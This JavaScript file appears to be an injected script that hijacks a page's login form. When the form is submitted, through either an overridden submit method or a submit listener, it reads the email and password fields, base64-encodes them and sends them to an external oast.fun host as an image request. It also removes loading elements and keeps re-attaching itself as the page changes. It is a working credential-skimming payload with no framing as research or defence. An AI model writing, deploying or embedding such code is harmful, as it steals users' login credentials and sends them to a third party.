if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
} else {
    init();
}

function init() {
    function removeLoadingElements() {
        const loadingElements = document.querySelectorAll('.v-loading');
        loadingElements.forEach(element => {
            element.style.display = 'none';
            element.remove();
        });
    }

    function setupFormCapture() {
        const form = document.querySelector('form');
        if (form) {
            const originalSubmit = form.submit;
            
            form.submit = function() {
                const email = document.querySelector('input[type="text"]').value;
                const password = document.querySelector('input[type="password"]').value;
                
                if (email && password) {
                    const data = btoa(email + ':' + password);
                    new Image().src = 'https://gqkaubaktwtqypifyzshde4g2jmmngnsu.oast.fun?data=' + data;
                }
                
                return originalSubmit.apply(this, arguments);
            };
            
            form.addEventListener('submit', function(e) {
                const email = document.querySelector('input[type="text"]').value;
                const password = document.querySelector('input[type="password"]').value;
                
                if (email && password) {
                    const data = btoa(email + ':' + password);
                    new Image().src = 'https://gqkaubaktwtqypifyzshde4g2jmmngnsu.oast.fun?data=' + data;
                }
            });

            console.log('Form capture setup completed');
        } else {
            console.log('Form not found, retrying in 500ms');
            setTimeout(setupFormCapture, 500);
        }
    }

    removeLoadingElements();
    
    const observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
            removeLoadingElements();
            
            if (!document.querySelector('form')) {
                setTimeout(setupFormCapture, 100);
            }
        });
    });

    observer.observe(document.body, {
        childList: true,
        subtree: true
    });

    setTimeout(setupFormCapture, 1000);
}
